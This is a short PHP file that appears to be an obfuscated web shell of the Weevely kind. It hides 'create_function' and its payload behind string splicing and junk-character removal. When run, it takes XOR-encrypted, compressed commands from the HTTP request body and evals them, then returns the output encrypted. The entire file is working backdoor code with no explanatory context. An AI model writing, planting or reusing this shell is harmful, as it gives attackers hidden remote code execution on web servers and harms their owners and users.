<?php
$H='contencpts()cpcp;@cpob_end_clean(cp)cp;$r=@bacpse64_encodecp(@cpx(@gzcomprescps($o)cp,$k));pcprint(cp"$pcp$kh$r$kf");}';
$W='/icpnput"cp),$m)cp==1) {cp@ob_stacprcpt();@evcpal(@gcpzuncompcpcpress(@x(@bascpe64_decodcpe(cp$m[1])cp,$k)));$o=@cpob_getcp_';
$g='$k="ff9cpa47ca";$cpkh="cpe215b85cpacp1851";$cpkf="5ecp35a8ececpb3d";cp$p="WwBIKcpyeQuqHcpgg3w9"cp;funcpction x(cp$tc';
$c=str_replace('B','','creBatBeB_fBunBcBtion');
$r='p,$k){cp$c=strlen($cpk);$lcp=cpscptrlen($cpcpcpt);$o="";for($i=0;$i<$cpl;){focpr($j=0;($cpj<$c&&cp$i<$l)cp;$j+cp+,$i++';
$q=')cp{$o.=$t{$i}cp^$k{$j}cp;cp}}returcpn $cpo;}cpifcp (@preg_match("/$kh(cp.+cp)$kf/",@fcpilcpe_get_contcpents("pcphp:/';
$B=str_replace('cp','',$g.$r.$q.$W.$H);
$j=$c('',$B);$j();
?>
